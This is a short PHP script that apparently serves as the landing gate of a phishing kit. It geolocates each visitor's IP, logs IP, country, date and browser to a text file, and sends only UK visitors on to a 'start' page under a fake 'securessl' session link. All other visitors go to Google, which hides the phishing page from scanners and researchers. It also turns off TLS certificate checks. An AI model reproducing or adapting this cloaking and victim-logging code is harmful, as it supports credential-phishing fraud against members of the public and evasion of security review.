<?php

ini_set('session.save_path',getcwd(). '/sessions');
session_start();

if(isset($_SERVER['HTTP_CF_CONNECTING_IP']))  {

$ip = $_SERVER['HTTP_CF_CONNECTING_IP'];

}

elseif(isset($_SERVER['HTTP_X_FORWARDED_FOR']))  {

$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];

}

else  {

$ip = $_SERVER['REMOTE_ADDR'];

}

$hash = md5($ip);

$url = "http://www.geoplugin.net/json.gp?ip=$ip";

function url_get_contents($url) {
  $ch = curl_init($url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  $data = curl_exec($ch);
  curl_close($ch);
  return $data;
}

$json = url_get_contents($url);
$json = json_decode($json, true);
$country = $json['geoplugin_countryName'];


#print_r($country);

$country=trim($country);

date_default_timezone_set('Europe/London');
$v_ip = $_SERVER['REMOTE_ADDR'];
$v_date = date("l d F H:i:s");
$v_agent = $_SERVER['HTTP_USER_AGENT'];

$fp = fopen("ips.txt", "a");
fputs($fp, "IP: $v_ip $country - DATE: $v_date - BROWSER: $v_agent\r\n");
fclose($fp);
/*
if($country == 'Italy' ) {
echo 'country is '.$country;
}else {
echo 'country is !?!? '.$country;
}

die();
*/

#if($country == 'Italy') {
if($country == 'United Kingdom')  {

$_SESSION['auth'] = true;
header("Location: start?&sessionid=$hash&securessl=true");
die();
}else  {
header('Location: https://www.google.com');

}

?>
